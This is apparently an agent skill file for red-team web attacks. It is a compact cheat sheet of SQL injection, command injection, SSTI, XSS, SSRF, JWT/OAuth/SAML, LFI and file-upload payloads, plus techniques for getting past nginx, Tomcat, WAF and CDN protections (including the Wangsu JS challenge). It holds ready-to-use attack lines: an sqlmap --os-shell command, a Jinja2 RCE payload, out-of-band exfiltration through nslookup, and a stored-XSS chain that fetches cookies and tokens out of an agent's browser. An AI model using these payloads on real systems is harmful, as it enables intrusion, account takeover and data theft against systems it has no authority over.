---
name: web-attack-methods
description: >-
  Full-stack web attacks: SQLi/command injection/SSTI/XSS/SSRF/NoSQL, auth JWT/OAuth/SAML, LFI/upload, Tomcat/WS/STOMP/XFF/PATH_INFO/CDN502/Wangsu JS challenge bypass. Use when testing Web injection, auth bypass, server-side, WAF/CDN bypass.
metadata:
  tags: [penetration-testing, red-team]
---

## Web Attack Techniques (Injection / Auth / Server-side / Misc / CDN)

```
=== Web Injection ===
SQLi: sqlmap -u URL --technique=BEUSTQ --risk=3 --level=5 --os-shell | manual: ' OR 1=1-- / ' AND SLEEP(5)--
  Bypass: SEL/**/ECT, case variation, CHAR() | Escalate: OUTFILE→webshell / xp_cmdshell / UDF
Command injection: ; | && $(cmd) `cmd` %0a | space bypass $IFS, cat bypass using tac/nl | OOB: ;nslookup $(whoami).OOB
SSTI: {{7*7}} Jinja2 ${7*7} FreeMarker #{7*7} Ruby | Jinja2 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
XSS: HTML/attribute/JS/href/DOM/SVG | CSP bypass with JSONP/AngularJS CDN | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd"> / "http://OOB/"
🚨Stored XSS via WebSocket/STOMP chat: agent panels in customer service systems (OCS/LiveChat) often render visitor messages with innerHTML/v-html (Vue domProps innerHTML)
  Attack chain: visitor STOMP connect → send message containing <img src=x onerror=fetch(...)> → agent opens conversation → XSS executes in agent's browser → steal cookie/token/localStorage
  Key point: agent browser can usually reach the internet (not constrained by backend air-gap)! Payload targets: document.cookie + localStorage + fetch(admin API).then(exfil)
  Bypass: mf:1 (visitor identity) messages, tp:0 (text type) content goes directly through innerHTML; image messages use url field (<img src>) and bypass innerHTML
SSRF: bypass IP: 2130706433/[::1]/nip.io/#@ | cloud metadata 169.254.169.254 | Redis gopher://127.0.0.1:6379/_
NoSQL: {"password":{"$ne":""}} / {"$regex":"^a"}

=== Authentication / Authorization ===
Auth bypass: admin'-- | password reset (predictable token / Host header injection) | MFA bypass (skip / brute-force 4-6 digits) | X-Forwarded-For IP rotation
IDOR: change resource ID for horizontal privilege escalation | mass assignment: {"role":"admin","isAdmin":true}
JWT: jwt_tool -X a (alg none / RS256→HS256) | -C brute weak key | kid injection | jku/x5u remote key
401/403 bypass: /admin/ /Admin /%2561dmin /admin;/ /admin..;/ | X-Original-URL / X-Rewrite-URL / X-Forwarded-For:127.0.0.1
OAuth/OIDC: redirect_uri manipulation (replace / suffix / @ confusion / path traversal) | missing state → CSRF | PKCE downgrade | id_token wraps JWT — all JWT attacks apply
SAML: XSW signature wrapping (SAML Raider) | signature stripping | comment truncation: admin<!---->@evil | Golden SAML (IdP private key)

=== Server-side ===
LFI: ../../../etc/passwd | php://filter read source code | data:// expect:// phar:// | RCE chain: log poisoning / session poisoning / phar deserialization
File upload: shell.php.jpg / .PHP / .php. / %00 | .htaccess change parsing | GIF89a magic bytes | ImageMagick/Ghostscript
🚨Spring Boot Actuator path traversal bypassing auth interceptors: interceptor matches /api/* but actuator is whitelisted → /actuator/../api/v1/endpoint bypasses interceptor to reach protected endpoint
  Mechanism: Spring Security / custom interceptors match paths before normalization; Tomcat normalizes paths before routing → path traversal bypasses interceptor but reaches target Servlet
  Verify: /actuator/health returns 200 (whitelisted) → /actuator/../target path also returns 200 (bypassed) vs direct /target returns 403/sign is empty (intercepted) | /actuator/health/../../target (template path {*path} traversal)
  Sign validation weakness: many custom sign validators only check that header is non-empty (sign:any-value + expTime:any-number passes) → finding code:500 instead of "sign is empty" = validation passed | quick check: sign:0 or sign:aaa changes from "sign is empty" to 500 = checking only non-empty
  Escalation: combine bypass with X-HTTP-Method-Override: POST to make GET request trigger POST handler (some Spring configs support this)

=== Web Miscellaneous ===
🚨Tomcat ..;/ bypasses nginx path restriction: nginx does not parse ; in URL (treats it as part of path) but Tomcat treats ..;/ as path traversal:
  /api/v1/v/..;/admin/path → nginx matches /api/v1/v/ (allows through) → Tomcat parses as /admin/path (traversal!)
  Verify: normal /admin returns nginx 403; using /api/v1/v/..;/admin returns Tomcat 404 = bypass successful
  Limitation: Spring MVC DispatcherServlet routing is independent of filesystem; can only access static files / non-MVC paths within same WAR
  Combine: with JSP webshell written by Spring4Shell, or to access actuator endpoints
🚨WebSocket/STOMP frames bypass nginx method restriction: nginx returns 405 for POST /api/v1/a/login, but STOMP frames after WebSocket upgrade are unrestricted:
  1. GET /api/v1/v/ws/{3-char}/{8-char-random}/websocket → 101 Upgrade (use visitor path to bypass)
  2. STOMP CONNECT → STOMP SEND destination:/app/a/login → reaches Spring backend directly
  SockJS XHR fallback: POST .../xhr_send to send STOMP frame (204 = success); no need for real WebSocket
  Pitfall: CDN drops connection quickly ("Another connection still open"); raw socket is more stable than WebSocket library
🚨X-Forwarded-For bypassing application-layer IP blacklist: CDN trusts XFF header; application reads client IP from XFF for blacklist check:
  Effective: X-Forwarded-For: 1.1.1.1 | X-Forwarded-For: 127.0.0.1, 10.0.0.1
  Ineffective: X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP, Forwarded
  Detect: response contains {code:10010, msg:"blacklisted"} and data field is your real IP
🚨PATH_INFO nginx deny bypass: nginx denies .php files (returns 146B nginx 404) but PHP-FPM still reachable via PATH_INFO:
  /denied/file.php → 404|146 (nginx blocks) | /denied/file.php/ → 16B "File not found." (PHP-FPM executes!)
  /denied/file.php/x → same. PHP-FPM returning "File not found." means request penetrated nginx deny to PHP-FPM (just wrong script path)
  Exploitation: if PHP is configured with cgi.fix_pathinfo=1 (default), /uploads/shell.jpg/x.php → PHP executes shell.jpg! | confirm then find actual FPM docroot (may differ from nginx)
  Identify: nginx deny returns fixed size (146B standard 404), PHP-FPM returns 16B "File not found." → size difference is the breakthrough signal
🚨Response size fingerprint (hidden file discovery): CMS catch-all route returns fixed-size homepage (e.g. 44004B), nginx real 404 returns 146B
  File exists but is denied: returns 146B (nginx 404) | File doesn't exist: returns catch-all size (44004B) → 146B = file actually exists!
  Method: bulk scan paths, classify by response size: catch-all = doesn't exist; nginx 404 = exists but forbidden; other sizes = accessible
WAF bypass decision tree: encoding → protocol-level → path → mutation → IP spoofing → smuggling | CORS: reflect Origin + Credentials:true
🚨CDN 502 bypass (URL pattern filtering): when CDN returns 502 for admin paths, HTTP encoding/smuggling/method changes all fail → change protocol:
  ①WebSocket upgrade: CDN usually only filters HTTP responses; WS path may not be in filter rules. /api/v1/a/ws/ returns 200 while /api/v1/a/doLogin returns 502 = WS path not filtered
  ②Find origin IP directly: historical DNS / cert transparency / SNI scan / same-subnet scan / email header Return-Path / Shodan fingerprint / CDN back-to-origin config leak / unique error page fingerprint → bypass CDN directly
  ③Non-standard ports: scan all ports on CDN node; some ports may proxy different backend or have different filter rules (e.g. 8085 exposes actuator)
  ④Path traversal: /api/v1/v/..;/a/doLogin lets Tomcat route to admin but CDN may not recognize it (note: CDN may still filter responses)
  ⑤Wildcard detection: all subdomains resolve to CDN = wildcard DNS, not real records. Compare results using 114.114.114.114 / 8.8.8.8
🚨WSCN/Wangsu CDN JS challenge identification and bypass: response contains `_jsc_ch_conf` + `ws_sec_page.js` = Wangsu JS challenge (not WAF block)
  Characteristics: cv:".domain",mt:"jhsq987",chType/chTs/chID/chHash fields | 403 page 6000+ bytes containing "Embed Iframe"
  Bypass: CDN only whitelist-exempts specific paths (e.g. /c/) from challenge → use Spring Boot ..;/ traversal (/c/..;/target_path) to penetrate backend's other routes
  Identify backend framework: JSON error {"timestamp":...,"status":...,"error":...,"path":...} = Spring Boot | 405 = route exists but wrong method

=== CDN Bypass (target behind CDN, admin interfaces return 502) ===
CDN 502 analysis: distinguish URL pattern filtering (fixed timing ~0.3s, all methods/encodings/ports/nodes return 502) vs response content filtering vs backend down
  Key determination: path traversal (/api/v1/v/..;/a/doLogin) returning Tomcat 404 = penetrated CDN to backend; returning 502 = CDN URL pattern blocking
  nginx 502 vs CDN PWS 502: nginx = edge-layer reverse proxy down; PWS = CDN global policy
```
